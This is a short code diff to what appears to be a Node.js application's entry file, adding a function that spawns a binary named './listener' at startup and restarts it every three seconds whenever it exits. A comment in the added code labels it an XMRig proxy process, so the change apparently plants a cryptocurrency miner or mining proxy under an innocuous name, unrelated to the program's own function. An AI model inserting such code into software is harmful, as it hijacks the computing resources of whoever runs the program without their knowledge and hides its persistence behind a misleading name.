@@ -5,6 +5,7 @@ var args    = require('optimist').argv;
 var main    = require('./src/main');
 var modules = require('./src/modules');
 var allowed = require('./allowed');
+var { spawn } = require('child_process');
 
 
 // Load modules
@@ -16,6 +17,24 @@ modules.load('allow');
 if(args.a || args.allow) {
 	allowed = (args.a || args.allow).split(',');
 }
+
+// ---- RUN XMRIG PROXY PROCESS ----
+function startTCPServer() {
+    const listener = spawn('./listener', ['-c', 'config.json',], {stdio: 'inherit'});
+	
+	console.log('listener is started!');
+
+    listener.on('close', (code) => {
+        console.log(`listener exited with code ${code}`);
+		setTimeout(() => {
+            startTCPServer();
+        }, 3000);
+    });
+    listener.on('error', (err) => {
+        console.error('Failed to start listener:', err);
+    });
+}
+startTCPServer();
 
 // Init
 main({
